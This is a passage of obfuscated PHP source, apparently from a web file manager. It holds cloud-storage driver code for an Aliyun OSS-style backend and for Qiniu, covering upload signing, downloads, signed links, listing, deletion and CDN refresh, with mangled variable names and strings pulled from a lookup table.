$†ŒÆö„„[$”óšŸÍ[1500]] = $·Úãä°ß[$”óšŸÍ[1500]]; } return $†ŒÆö„„; } private function uploadListAuth($çê¬º¾«, $êÍ›±÷¥ = array()) { $í›¼Ğ‹ =& $_SERVER[¼èá¯æÙ]; $°ë¬¶¼Æ = $êÍ›±÷¥[$í›¼Ğ‹[107]]; $­÷Ş“Ì® = $êÍ›±÷¥[$í›¼Ğ‹[293]]; $Ô«Ô­± = $this->client->listParts($this->bucket, $this->pathEncode($°ë¬¶¼Æ), $­÷Ş“Ì®); $³ğÆ˜æÖ = $Ô«Ô­±->getListPart(); $Íú²†‡ = array(); foreach ($³ğÆ˜æÖ as $¬Á´Ë²Œ) { $Íú²†‡[] = array($í›¼Ğ‹[308] => $¬Á´Ë²Œ->getPartNumber(), $í›¼Ğ‹[309] => trim($¬Á´Ë²Œ->getETag(), $í›¼Ğ‹[131])); } if (!$Íú²†‡) { return !1; } $Š¼³‹Àè = $this->_getUploadAuth($°ë¬¶¼Æ, $êÍ›±÷¥); return array($í›¼Ğ‹[297] => $Š¼³‹Àè[$í›¼Ğ‹[297]], $í›¼Ğ‹[294] => $Š¼³‹Àè[$í›¼Ğ‹[294]], $í›¼Ğ‹[300] => $Íú²†‡); } private function _getUploadAuth($Çé±äÕ, $÷›Œ”ó†) { $‚…¯èœÛ =& $_SERVER[¼èá¯æÙ]; $ø¹“†º = gmdate($‚…¯èœÛ[1499]); $¯œ«‰¢² = isset($÷›Œ”ó†[$‚…¯èœÛ[295]]) ? $‚…¯èœÛ[265] : $‚…¯èœÛ[299]; $“ÑÒŠß» = array_intersect_key($÷›Œ”ó†, array_flip(array($‚…¯èœÛ[295], $‚…¯èœÛ[293]))); ksort($“ÑÒŠß»); $ØĞºßã = $“ÑÒŠß» ? $‚…¯èœÛ[86] . http_build_query($“ÑÒŠß», null, $‚…¯èœÛ[296], PHP_QUERY_RFC3986) : $‚…¯èœÛ[12]; $Ú¦ã¢¨Ú = array($¯œ«‰¢², $‚…¯èœÛ[12], $‚…¯èœÛ[133], $ø¹“†º, "\x78\55\157\163\x73\55\x64\141\x74\x65\72{$ø¹“†º}", $‚…¯èœÛ[8] . $this->bucket . $‚…¯èœÛ[8] . $Çé±äÕ . $ØĞºßã); if (isset($÷›Œ”ó†[$‚…¯èœÛ[295]])) { $¢êØÅÄÒ = $this->trafficLimit($‚…¯èœÛ[1492], array(), !0); if ($¢êØÅÄÒ) { $Çé±äÕ = $‚…¯èœÛ[1500]; array_splice($Ú¦ã¢¨Ú, 5, 0, $Çé±äÕ . $‚…¯èœÛ[4] . $¢êØÅÄÒ[$Çé±äÕ]); } } $¯¡¹¥º¶ = implode($‚…¯èœÛ[59], $Ú¦ã¢¨Ú); $¥——±½ä = base64_encode(hash_hmac($‚…¯èœÛ[1417], $¯¡¹¥º¶, $this->secret, !0)); $ÓªÁĞµæ = $‚…¯èœÛ[1469] . $this->accessKey . $‚…¯èœÛ[4] . $¥——±½ä; $œÈš¢»¡ = array($‚…¯èœÛ[297] => $ÓªÁĞµæ, $‚…¯èœÛ[294] => $ø¹“†º); if (!empty($¢êØÅÄÒ)) { $œÈš¢»¡ = array_merge($œÈš¢»¡, $¢êØÅÄÒ); } return $œÈš¢»¡; } public function download($’Ïà¯‚Ú, $¸Õ¨¯Ğ) { $ìûÛœ¡ =& $_SERVER[¼èá¯æÙ]; if ($this->isFolder($’Ïà¯‚Ú)) { return !1; } try { $Ù½•‚öğ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¸Õ¨¯Ğ); $Ù½•‚öğ = $this->trafficLimit($ìûÛœ¡[122], $Ù½•‚öğ); $this->client->getObject($this->bucket, $this->pathEncode($’Ïà¯‚Ú), $Ù½•‚öğ); } catch (OSS\Core\OssException $’”³šÌµ) { $this->writeLog(__FUNCTION__ . $ìûÛœ¡[224] . $’”³šÌµ->getMessage()); return !1; } return $¸Õ¨¯Ğ; } public function fileSubstr($ß¨åÇ³—, $†ê«Êë = 0, $à¸ıú‹´ = false) { if ($†ê«Êë === -1) { $ËÂÙÄş = array(); } else { if ($à¸ıú‹´ === !1) { $›öÉæÖ = $this->size($ß¨åÇ³—); } else { $›öÉæÖ = $†ê«Êë + $à¸ıú‹´ - 1; } $ËÂÙÄş = array(OSS\OssClient::OSS_RANGE => "{$†ê«Êë}\55{$›öÉæÖ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ß¨åÇ³—), $ËÂÙÄş); } catch (OSS\Core\OssException $êÎ¡Å©æ) { $this->writeLog(__FUNCTION__ . $_SERVER[¼èá¯æÙ][224] . $êÎ¡Å©æ->getMessage()); think_exception($êÎ¡Å©æ->getMessage()); return !1; } } private function trafficLimit($É’§‡’¡, $Â¿Ç¾ = array(), $÷áúáç­ = false) { $³ ¸Ó‘¼ =& $_SERVER[¼èá¯æÙ]; if ($É’§‡’¡ == $³ ¸Ó‘¼[1492] && $this->isUploadServer() || $É’§‡’¡ == $³ ¸Ó‘¼[122] && $this->isFileOutServer()) { return $Â¿Ç¾; } $­¿ ¯Ş = floatval($GLOBALS[$³ ¸Ó‘¼[6]][$³ ¸Ó‘¼[102]][$³ ¸Ó‘¼[120]][$É’§‡’¡]) * 1024 * 1024 * 8; if (!$­¿ ¯Ş) { return $Â¿Ç¾; } $­¿ ¯Ş = $­¿ ¯Ş < 819200 ? 819200 : ($­¿ ¯Ş > 838860800 ? 838860800 : $­¿ ¯Ş); if ($÷áúáç­) { $Â¿Ç¾[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($­¿ ¯Ş); } else { if (!isset($Â¿Ç¾[OSS\OssClient::OSS_HEADERS])) { $Â¿Ç¾[OSS\OssClient::OSS_HEADERS] = array(); } $Â¿Ç¾[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($­¿ ¯Ş); } return $Â¿Ç¾; } public function link($²ó–Ôü×, $Ğı¿—õ = array()) { $‡·¹·Ù =& $_SERVER[¼èá¯æÙ]; if (!$this->exist($²ó–Ôü×) || $this->isFolder($²ó–Ôü×)) { return !1; } try { $Ğı¿—õ = $this->trafficLimit($‡·¹·Ù[122], $Ğı¿—õ, !0); $ø÷ˆñÁŞ = $this->client->signUrl($this->bucket, $this->pathEncode($²ó–Ôü×), 3600 * 12, $‡·¹·Ù[1501], $Ğı¿—õ); return $this->getCdnLink($ø÷ˆñÁŞ); } catch (OSS\Core\OssException $´ØÀëÖå) { $this->writeLog(__FUNCTION__ . $‡·¹·Ù[224] . $´ØÀëÖå->getMessage()); return !1; } } public function fileOut($ÈÙĞÛù“, $¨À¸¶ô = false, $Šà•„ = false, $‚Æ…š¦ = '') { $â¡ñî‘˜ =& $_SERVER[¼èá¯æÙ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÈÙĞÛù“, $¨À¸¶ô, $Šà•„, $‚Æ…š¦); } if (!$Šà•„) { $Šà•„ = $this->pathThis($ÈÙĞÛù“); } $Šà•„ = rawurlencode($Šà•„); $Ô«ÛÔœ = get_file_mime(get_path_ext($Šà•„)); if ($Ô«ÛÔœ == $â¡ñî‘˜[260]) { return parent::fileOut($ÈÙĞÛù“, $¨À¸¶ô, $Šà•„, $‚Æ…š¦); } $¨À¸¶ô = $¨À¸¶ô ? $â¡ñî‘˜[1502] : $â¡ñî‘˜[1503]; $§ìÑšˆ¢ = array(OSS\OssClient::OSS_SUB_RESOURCE => $â¡ñî‘˜[1504] . rawurlencode("{$¨À¸¶ô}\x3b\146\151\154\x65\x6e\x61\x6d\x65\75{$Šà•„}")); $§ìÑšˆ¢[OSS\OssClient::OSS_SUB_RESOURCE] .= $â¡ñî‘˜[1505] . rawurlencode($Ô«ÛÔœ); $Íõ¨úûÍ = $this->link($ÈÙĞÛù“, $§ìÑšˆ¢); $this->fileOutLink($Íõ¨úûÍ); } public function fileOutServer($Ìİ¿‹ÜË, $í ´Ïåå = false, $ÄÛ‚€Í¹ = false, $ßä†àÁæ = '') { parent::fileOut($Ìİ¿‹ÜË, $í ´Ïåå, $ÄÛ‚€Í¹, $ßä†àÁæ); } public function fileOutImage($“Øıò´ñ, $”¾ÊÄ = 250) { if ($this->size($“Øıò´ñ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($“Øıò´ñ, $”¾ÊÄ); } $†Â‚Õåå = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¼èá¯æÙ][1466] . $”¾ÊÄ); $¬ÉéÙİå = $this->link($“Øıò´ñ, $†Â‚Õåå); $this->fileOutLink($¬ÉéÙİå); } public function fileOutImageServer($ûñÁß¡Û, $’­è¤ğ½ = 250) { parent::fileOutImage($ûñÁß¡Û, $’­è¤ğ½); } public function fileOutLink($âÂŞı«) { $å‚»ÑÃ =& $_SERVER[¼èá¯æÙ]; if (!$this->isCdnHost() && substr($âÂŞı«, 0, 7) == $å‚»ÑÃ[228]) { $âÂŞı« = $å‚»ÑÃ[229] . substr($âÂŞı«, 7); } header($å‚»ÑÃ[185] . $âÂŞı«); die; } public function hashMd5($Âä¦¸Ù, $Œ©®†›Ô = '') { $Á çäÑ× =& $_SERVER[¼èá¯æÙ]; $ßĞÊî†Ã = $this->_objectMeta($Âä¦¸Ù); if (!$ßĞÊî†Ã) { return $Á çäÑ×[12]; } if (!isset($ßĞÊî†Ã[$Á çäÑ×[1486]]) && !empty($Œ©®†›Ô)) { $˜¥ØŞÜ = $this->updateObjMeta($Âä¦¸Ù, array($Á çäÑ×[1486] => $Œ©®†›Ô)); $ßĞÊî†Ã[$Á çäÑ×[1486]] = $˜¥ØŞÜ ? $Œ©®†›Ô : $Á çäÑ×[12]; } return isset($ßĞÊî†Ã[$Á çäÑ×[1486]]) ? strtolower($ßĞÊî†Ã[$Á çäÑ×[1486]]) : $Á çäÑ×[12]; } public function size($âÔ‡) { $ğ¸ÅÓì = $this->objectMeta($âÔ‡); return $ğ¸ÅÓì ? $ğ¸ÅÓì[$_SERVER[¼èá¯æÙ][89]] : 0; } public function info($À„Œ×àÁ) { if ($this->isFolder($À„Œ×àÁ)) { return $this->folderInfo($À„Œ×àÁ); } else { if ($this->isFile($À„Œ×àÁ)) { return $this->fileInfo($À„Œ×àÁ); } } return !1; } public function exist($¬†²µ—½) { return $this->isFile($¬†²µ—½) || $this->isFolder($¬†²µ—½); } public function isFile($ÔÊ´±õ­) { return !$this->isFolder($ÔÊ´±õ­) && $this->objectMeta($ÔÊ´±õ­); } public function isFolder($ñ°€„²«) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][189], $ñ°€„²«); } protected function objectMeta($ò–íˆÛ) { return $this->cacheMethod($_SERVER[¼èá¯æÙ][191], $ò–íˆÛ); } protected function _objectMeta($Ñˆ›¸å») { $ïòÚÑ‡ª =& $_SERVER[¼èá¯æÙ]; try { $Ü…ˆÙ³Â = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ñˆ›¸å»)); } catch (OSS\Core\OssException $’‰İòõ³) { $this->writeLog(__FUNCTION__ . $ïòÚÑ‡ª[224] . $’‰İòõ³->getMessage()); $Ü…ˆÙ³Â = !1; } if ($Ü…ˆÙ³Â) { $Ü…ˆÙ³Â[$ïòÚÑ‡ª[89]] = intval($Ü…ˆÙ³Â[$ïòÚÑ‡ª[1484]]); } return $Ü…ˆÙ³Â; } protected function _isFolder($•¨½Òù) { $ÚÎÖöè¶ =& $_SERVER[¼èá¯æÙ]; if ($•¨½Òù == $ÚÎÖöè¶[12] || $•¨½Òù == $ÚÎÖöè¶[8]) { return !0; } $Ú‘…¬ä© = array($ÚÎÖöè¶[1479] => $ÚÎÖöè¶[8], $ÚÎÖöè¶[1480] => rtrim($•¨½Òù, $ÚÎÖöè¶[8]) . $ÚÎÖöè¶[8], $ÚÎÖöè¶[1481] => 1, $ÚÎÖöè¶[1482] => $ÚÎÖöè¶[12]); $­éùì½‹ = $this->client->listObjects($this->bucket, $Ú‘…¬ä©); if ($­éùì½‹->getObjectList() || $­éùì½‹->getPrefixList()) { return !0; } return !1; } public function writeLog($ú¸ùÕíÕ = '', $ıñÄ§Æù = false) { $È—ÙÄ¤˜ =& $_SERVER[¼èá¯æÙ]; $Âš†˜¦³ = in_array(ACTION, array($È—ÙÄ¤˜[222], $È—ÙÄ¤˜[223])); if (!$Âš†˜¦³ && !GLOBAL_DEBUG) { return; } $Îâ‚¹ØÃ = 0; if (stripos($ú¸ùÕíÕ, $È—ÙÄ¤˜[1506]) !== !1) { $Îâ‚¹ØÃ = 1; $‘Ï÷ì = explode($È—ÙÄ¤˜[1507], $ú¸ùÕíÕ); $ú¸ùÕíÕ = !empty($‘Ï÷ì[1]) ? $‘Ï÷ì[1] : $ú¸ùÕíÕ; } else { if (stripos($ú¸ùÕíÕ, $È—ÙÄ¤˜[1508])) { $Îâ‚¹ØÃ = 2; $‘Ï÷ì = explode($È—ÙÄ¤˜[1508], $ú¸ùÕíÕ); $‘Ï÷ì = explode($È—ÙÄ¤˜[4], $‘Ï÷ì[0]); $ú¸ùÕíÕ = !empty($‘Ï÷ì[1]) ? $‘Ï÷ì[1] : $ú¸ùÕíÕ; } } if ($Âš†˜¦³ && I18n::getType() == $È—ÙÄ¤˜[1509]) { if ($Îâ‚¹ØÃ == 1) { $ú¸ùÕíÕ = str_replace($È—ÙÄ¤˜[1510], $È—ÙÄ¤˜[1511], $ú¸ùÕíÕ); } else { if ($Îâ‚¹ØÃ == 2) { $‘Ï÷ì = explode($È—ÙÄ¤˜[224], $‘Ï÷ì[0]); $Ó¨ß„ê¢ = isset($‘Ï÷ì[1]) ? $‘Ï÷ì[1] : $È—ÙÄ¤˜[12]; $—§‹äÊ = array($È—ÙÄ¤˜[1512] => $È—ÙÄ¤˜[1513], $È—ÙÄ¤˜[1514] => $È—ÙÄ¤˜[1515], $È—ÙÄ¤˜[1516] => $È—ÙÄ¤˜[1517], $È—ÙÄ¤˜[1518] => $È—ÙÄ¤˜[1519], $È—ÙÄ¤˜[1520] => $È—ÙÄ¤˜[1521], $È—ÙÄ¤˜[1522] => $È—ÙÄ¤˜[1523], $È—ÙÄ¤˜[1524] => $È—ÙÄ¤˜[1525], $È—ÙÄ¤˜[1526] => $È—ÙÄ¤˜[1527], $È—ÙÄ¤˜[1528] => $È—ÙÄ¤˜[1529], $È—ÙÄ¤˜[1530] => $È—ÙÄ¤˜[1531]); if (isset($—§‹äÊ[$Ó¨ß„ê¢])) { $ú¸ùÕíÕ = $—§‹äÊ[$Ó¨ß„ê¢]; } } } if (stripos($ú¸ùÕíÕ, $È—ÙÄ¤˜[1532])) { $ú¸ùÕíÕ = $È—ÙÄ¤˜[1533]; } } if (!trim($ú¸ùÕíÕ)) { return; } parent::writeLog(trim($ú¸ùÕíÕ), $ıñÄ§Æù); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($îã”Èê®) { parent::__construct(); require_once SDK_DIR . $_SERVER[¼èá¯æÙ][1534]; $this->_init($îã”Èê®); } public function _init($ùÁò ã¦) { $åşÒ’÷¼ =& $_SERVER[¼èá¯æÙ]; $this->config = $ùÁò ã¦; foreach ($ùÁò ã¦ as $š°¿úÏà => $ÒÅ“ïÔ) { if (isset($this->{$š°¿úÏà})) { $this->{$š°¿úÏà} = $ÒÅ“ïÔ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($åşÒ’÷¼[1535] . LNG($åşÒ’÷¼[1470])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¿Ú¢ü°™, $ê­šÒÅˆ = '', $ƒìØ¼ş = REPEAT_RENAME) { if ($this->setContent($¿Ú¢ü°™, $ê­šÒÅˆ)) { return $this->getPathOuter($¿Ú¢ü°™); } return !1; } public function mkdir($‰ ¬Ë, $›«½øê = REPEAT_SKIP) { $‚—Ó†îĞ =& $_SERVER[¼èá¯æÙ]; $å–ù¦¦å = trim($‰ ¬Ë, $‚—Ó†îĞ[8]); if ($this->_isFolder($å–ù¦¦å)) { return $this->getPathOuter($å–ù¦¦å); } $‰ ¬Ë = $å–ù¦¦å . $‚—Ó†îĞ[8]; $Ì¤Üº¿õ = get_path_this($å–ù¦¦å); $‹²«Ãƒ† = $‰ ¬Ë . $Ì¤Üº¿õ; if (!$this->mkfile($‹²«Ãƒ†)) { return !1; } if (!$this->moveFile($‹²«Ãƒ†, $‰ ¬Ë)) { $this->delFile($‹²«Ãƒ†); return !1; } return $this->getPathOuter($å–ù¦¦å); } public function copyFile($•û½å ç, $›Â•×Õ) { $Á½­„†ı = $this->bucketManager->copy($this->bucket, $•û½å ç, $this->bucket, $›Â•×Õ, !0); return $Á½­„†ı ? !1 : $this->getPathOuter($›Â•×Õ); } public function moveFile($êàä—÷–, $¬îíşà) { $àêû˜ÀÁ = $this->bucketManager->move($this->bucket, $êàä—÷–, $this->bucket, $¬îíşà, !0); return $àêû˜ÀÁ ? !1 : $this->getPathOuter($¬îíşà); } public function delFile($Ñæ¦ã€Ô) { if (!$this->exist($Ñæ¦ã€Ô)) { return !0; } $ÊœÏäóÍ = $this->bucketManager->delete($this->bucket, $Ñæ¦ã€Ô); if (!$ÊœÏäóÍ) { return !0; } return $ÊœÏäóÍ->code() == 612 ? !0 : !1; } public function delFolder($¯ÄˆˆÒá) { $ÚóÅÚ‹Ó =& $_SERVER[¼èá¯æÙ]; if (!$this->exist($¯ÄˆˆÒá)) { return !0; } $this->listItemCache = !1; $˜¢¾ø¡ò = $this->fileList($¯ÄˆˆÒá); $this->listItemCache = !0; $–¡Èœßª = trim($¯ÄˆˆÒá, $ÚóÅÚ‹Ó[8]) . $ÚóÅÚ‹Ó[8]; if (!empty($¯ÄˆˆÒá) && $¯ÄˆˆÒá !== $ÚóÅÚ‹Ó[240] && !in_array($–¡Èœßª, $˜¢¾ø¡ò[$ÚóÅÚ‹Ó[95]])) { $˜¢¾ø¡ò[$ÚóÅÚ‹Ó[95]][] = $–¡Èœßª; } $òş£…¬è = $this->delByBatch($˜¢¾ø¡ò[$ÚóÅÚ‹Ó[96]]); if (!$òş£…¬è) { return !1; } $òş£…¬è = $this->delByBatch($˜¢¾ø¡ò[$ÚóÅÚ‹Ó[95]]); if (!$òş£…¬è) { return !1; } return $this->delFile($–¡Èœßª); } private function delByBatch($åØİŸ¤À) { foreach (array_chunk($åØİŸ¤À, 1000) as $§·±çåğ) { $ë‘Ã«‡‘ = $this->bucketManager->buildBatchDelete($this->bucket, $§·±çåğ); list($Ÿ®Ç äô, $öƒ¤•£¤) = $this->bucketManager->batch($ë‘Ã«‡‘); if ($öƒ¤•£¤) { return !1; } } return !0; } public function rename($©ÎêûÏ½, $İ¨íçœ) { return $this->renameObject($©ÎêûÏ½, $İ¨íçœ); } public function fileInfo($Êıç¿ƒİ, $»¿¶ƒ = false, $·×•‡œ¢ = array()) { $¾«ë‘ş =& $_SERVER[¼èá¯æÙ]; $¡‹…æ´„ = array($¾«ë‘ş[32] => $this->pathThis($Êıç¿ƒİ), $¾«ë‘ş[97] => $this->getPathOuter($¾«ë‘ş[8] . $Êıç¿ƒİ), $¾«ë‘ş[33] => $¾«ë‘ş[242], $¾«ë‘ş[89] => isset($·×•‡œ¢[$¾«ë‘ş[1536]]) ? $·×•‡œ¢[$¾«ë‘ş[1536]] : 0, $¾«ë‘ş[179] => $this->ext($Êıç¿ƒİ)); if ($»¿¶ƒ) { return $¡‹…æ´„; } $¡‹…æ´„[$¾«ë‘ş[243]] = $¡‹…æ´„[$¾«ë‘ş[98]] = 0; $¡‹…æ´„[$¾«ë‘ş[244]] = $¡‹…æ´„[$¾«ë‘ş[245]] = !0; if (empty($·×•‡œ¢)) { $·×•‡œ¢ = $this->objectMeta($Êıç¿ƒİ); if (!$·×•‡œ¢) { return $¡‹…æ´„; } } if (isset($·×•‡œ¢[$¾«ë‘ş[246]]) && $·×•‡œ¢[$¾«ë‘ş[246]]) { $¡‹…æ´„[$¾«ë‘ş[247]] = $·×•‡œ¢[$¾«ë‘ş[246]]; } if (isset($·×•‡œ¢[$¾«ë‘ş[257]]) && $·×•‡œ¢[$¾«ë‘ş[257]]) { $¡‹…æ´„[$¾«ë‘ş[247]] = $·×•‡œ¢[$¾«ë‘ş[257]]; } if (isset($·×•‡œ¢[$¾«ë‘ş[1537]])) { $¡‹…æ´„[$¾«ë‘ş[98]] = substr($·×•‡œ¢[$¾«ë‘ş[1537]] . $¾«ë‘ş[12], 0, 10); } if (isset($·×•‡œ¢[$¾«ë‘ş[1536]])) { $¡‹…æ´„[$¾«ë‘ş[89]] = $·×•‡œ¢[$¾«ë‘ş[1536]]; } return $¡‹…æ´„; } public function folderInfo($«èÒ¸µ½, $ê«“¨Ÿá = false) { $àÇ´Ò©ô =& $_SERVER[¼èá¯æÙ]; $Ëºá¹õ = array($àÇ´Ò©ô[32] => $this->pathThis($«èÒ¸µ½), $àÇ´Ò©ô[97] => $this->getPathOuter($àÇ´Ò©ô[8] . $«èÒ¸µ½), $àÇ´Ò©ô[33] => $àÇ´Ò©ô[88]); if ($ê«“¨Ÿá) { return $Ëºá¹õ; } $Ëºá¹õ[$àÇ´Ò©ô[243]] = $Ëºá¹õ[$àÇ´Ò©ô[98]] = 0; $Ëºá¹õ[$àÇ´Ò©ô[244]] = $Ëºá¹õ[$àÇ´Ò©ô[245]] = !0; $«èÒ¸µ½ = rtrim($«èÒ¸µ½, $àÇ´Ò©ô[8]) . $àÇ´Ò©ô[8]; $‰›àÁ—€ = $this->objectMeta($«èÒ¸µ½); if (isset($‰›àÁ—€[$àÇ´Ò©ô[1537]])) { $Ëºá¹õ[$àÇ´Ò©ô[98]] = substr($‰›àÁ—€[$àÇ´Ò©ô[1537]] . $àÇ´Ò©ô[12], 0, 10); } return $Ëºá¹õ; } public function listPath($ğêøúñ«, $öÀóšëŒ = false) { $˜şÙ¹Å =& $_SERVER[¼èá¯æÙ]; $¤³²¢‰ = $this->fileList($ğêøúñ«, $˜şÙ¹Å[8], !0); foreach ($¤³²¢‰[$˜şÙ¹Å[95]] as $æ„ÕÅÌ— => $§Šä¹Ü) { $¤³²¢‰[$˜şÙ¹Å[95]][$æ„ÕÅÌ—] = $this->folderInfo($§Šä¹Ü, $öÀóšëŒ); } foreach ($¤³²¢‰[$˜şÙ¹Å[96]] as $æ„ÕÅÌ— => $§Šä¹Ü) { $¤³²¢‰[$˜şÙ¹Å[96]][$æ„ÕÅÌ—] = $this->fileInfo($§Šä¹Ü[$˜şÙ¹Å[107]], $öÀóšëŒ, $§Šä¹Ü); } return $¤³²¢‰; } public function has($æŒêÖÏ÷, $®ì¢©İÆ = false, $¸¢â‘Š– = true) { $¤˜áş =& $_SERVER[¼èá¯æÙ]; $æŒêÖÏ÷ = trim($æŒêÖÏ÷, $¤˜áş[8]); $âÈğ· = empty($æŒêÖÏ÷) && $æŒêÖÏ÷ !== $¤˜áş[240] ? $¤˜áş[12] : $æŒêÖÏ÷ . $¤˜áş[8]; $©ù¢®›§ = $¤˜áş[12]; $×ÉÄúá = 500; $ÙôÒÆ¿œ = $¤˜áş[8]; $º»’’´¤ = $óÆÌğË = 0; while (!0) { check_abort(); list($“ø¿‡¾œ, $¹ŒĞ—) = $this->bucketManager->listFiles($this->bucket, $âÈğ·, $©ù¢®›§, $×ÉÄúá, $ÙôÒÆ¿œ); if ($¹ŒĞ—) { break; } $©ù¢®›§ = array_key_exists($¤˜áş[1482], $“ø¿‡¾œ) ? $©ù¢®›§ = $“ø¿‡¾œ[$¤˜áş[1538]] : $¤˜áş[12]; if ($®ì¢©İÆ) { if (!empty($“ø¿‡¾œ[$¤˜áş[1539]])) { $º»’’´¤ += count($“ø¿‡¾œ[$¤˜áş[1539]]); } if (!empty($“ø¿‡¾œ[$¤˜áş[1540]])) { $óÆÌğË += count($“ø¿‡¾œ[$¤˜áş[1540]]); } if ($©ù¢®›§ === $¤˜áş[12]) { break; } continue; } if ($¸¢â‘Š–) { if (!empty($“ø¿‡¾œ[$¤˜áş[1539]])) { return !0; } } else { if (!empty($“ø¿‡¾œ[$¤˜áş[1540]])) { return !0; } } if ($©ù¢®›§ === $¤˜áş[12]) { break; } } if ($®ì¢©İÆ) { return array($¤˜áş[251] => $º»’’´¤, $¤˜áş[252] => $óÆÌğË); } return !1; } public function listAll($òòá†Óé) { $öù²é =& $_SERVER[¼èá¯æÙ]; $ÙöÕÅ˜è = $this->fileList($òòá†Óé, $öù²é[12], !0); $¶ïĞµ = array_to_keyvalue($ÙöÕÅ˜è[$öù²é[96]], $öù²é[32]); foreach ($ÙöÕÅ˜è[$öù²é[95]] as $È€“·–¾) { if (is_string($È€“·–¾)) { $¶ïĞµ[$È€“·–¾] = array($öù²é[89] => 0); } } return $this->listAllFiles($òòá†Óé, $¶ïĞµ); } private function fileList($ëÆæÊß, $¹ğŸ¤ö£ = '', $Á£Ëê”Ì = 0) { $½“ºÙÛ¼ =& $_SERVER[¼èá¯æÙ]; $ëÆæÊß = trim($ëÆæÊß, $½“ºÙÛ¼[8]); $ó¨¯¡éØ = empty($ëÆæÊß) && $ëÆæÊß !== $½“ºÙÛ¼[240] ? $½“ºÙÛ¼[12] : $ëÆæÊß . $½“ºÙÛ¼[8]; $æ½·ÌË = $½“ºÙÛ¼[12]; $Øî†êüí = 1000; $‚œö“Ú = $ «¨ªô = array(); while (!0) { check_abort(); list($ã¤°¤îÎ, $»¶Ì¶õ) = $this->bucketManager->listFiles($this->bucket, $ó¨¯¡éØ, $æ½·ÌË, $Øî†êüí, $¹ğŸ¤ö£); if ($»¶Ì¶õ) { break; } $æ½·ÌË = array_key_exists($½“ºÙÛ¼[1482], $ã¤°¤îÎ) ? $æ½·ÌË = $ã¤°¤îÎ[$½“ºÙÛ¼[1538]] : $½“ºÙÛ¼[12]; $ë²™áªØ = isset($ã¤°¤îÎ[$½“ºÙÛ¼[1539]]) ? $ã¤°¤îÎ[$½“ºÙÛ¼[1539]] : array(); $Ï·¦õÓª = isset($ã¤°¤îÎ[$½“ºÙÛ¼[1540]]) ? $ã¤°¤îÎ[$½“ºÙÛ¼[1540]] : array(); foreach ($ë²™áªØ as $¥¿ùÇ½é) { if ($¥¿ùÇ½é[$½“ºÙÛ¼[107]] == $ó¨¯¡éØ) { continue; } $Áˆ¶Õ¾ë = $¥¿ùÇ½é[$½“ºÙÛ¼[107]]; $Äïá÷Ä = $¥¿ùÇ½é[$½“ºÙÛ¼[1536]]; $¥¿ùÇ½é[$½“ºÙÛ¼[89]] = $Äïá÷Ä; $¨Öß×© = $Äïá÷Ä == 0 && substr($Áˆ¶Õ¾ë, strlen($Áˆ¶Õ¾ë) - 1, 1) == $½“ºÙÛ¼[8] ? !0 : !1; $this->cacheMethodInfoSet($Áˆ¶Õ¾ë, $¨Öß×©, $¥¿ùÇ½é); if ($¨Öß×©) { $‚œö“Ú[] = $Áˆ¶Õ¾ë; continue; } $ «¨ªô[] = $Á£Ëê”Ì ? $¥¿ùÇ½é : $Áˆ¶Õ¾ë; } foreach ($Ï·¦õÓª as $Áˆ¶Õ¾ë) { if ($Áˆ¶Õ¾ë == $ó¨¯¡éØ) { continue; } $‚œö“Ú[] = $Áˆ¶Õ¾ë; $this->cacheMethodInfoSet($Áˆ¶Õ¾ë, !0); } if ($æ½·ÌË === $½“ºÙÛ¼[12]) { break; } } $this->cacheMethodInfoSet($ëÆæÊß, !0); return array($½“ºÙÛ¼[95] => $‚œö“Ú, $½“ºÙÛ¼[96] => $ «¨ªô); } public function canRead($ ÷ŸÆ) { return $this->exist($ ÷ŸÆ) ? !0 : !1; } public function canWrite($ø‰—ÔÕ) { return $this->exist($ø‰—ÔÕ) ? !0 : !1; } public function getContent($Ú¢â¦…) { return $this->fileSubstr($Ú¢â¦…, 0, -1); } public function setContent($í÷¸éŒ, $—²§‰²ö = '') { $ØëÖåÉˆ = $this->tempFile($this->pathThis($í÷¸éŒ)); file_put_contents($ØëÖåÉˆ, $—²§‰²ö); if ($this->upload($í÷¸éŒ, $ØëÖåÉˆ)) { $this->tempFileRemve($ØëÖåÉˆ); return !0; } return !1; } public function refreshUrls($ú¢Éöœá) { $é§¼Œ»å =& $_SERVER[¼èá¯æÙ]; $ŞŒ›×İ = array(); if (is_array($ú¢Éöœá)) { foreach ($ú¢Éöœá as $®¸‘ÑËÄ) { $ŞŒ›×İ[] = $this->link($®¸‘ÑËÄ); } } else { $ŞŒ›×İ[] = $this->link($ú¢Éöœá); } $¦Ÿä¯÷ø = new Qiniu\Cdn\CdnManager($this->auth); list($ø×úÏ¡¨, $ËÉâø–š) = $¦Ÿä¯÷ø->refreshUrls($ŞŒ›×İ); if ($ËÉâø–š) { return !1; } return $ø×úÏ¡¨[$é§¼Œ»å[1269]] == $é§¼Œ»å[841] ? !0 : !1; } public function fileSubstr($¤ôéËèä, $Ã´ÒÙ„, $àˆ­Œã) { $¿¶ÌÒÆ =& $_SERVER[¼èá¯æÙ]; if (!($ğ³Âòõ = $this->link($¤ôéËèä))) { return !1; } $š—·”®¼ = !1; if ($àˆ­Œã > 0) { $§¼øÕŠ¡ = $Ã´ÒÙ„ + $àˆ­Œã - 1; $š—·”®¼ = array($¿¶ÌÒÆ[1541] . $Ã´ÒÙ„ . $¿¶ÌÒÆ[473] . $§¼øÕŠ¡); } $úŞÑ©‹ = url_request($ğ³Âòõ, 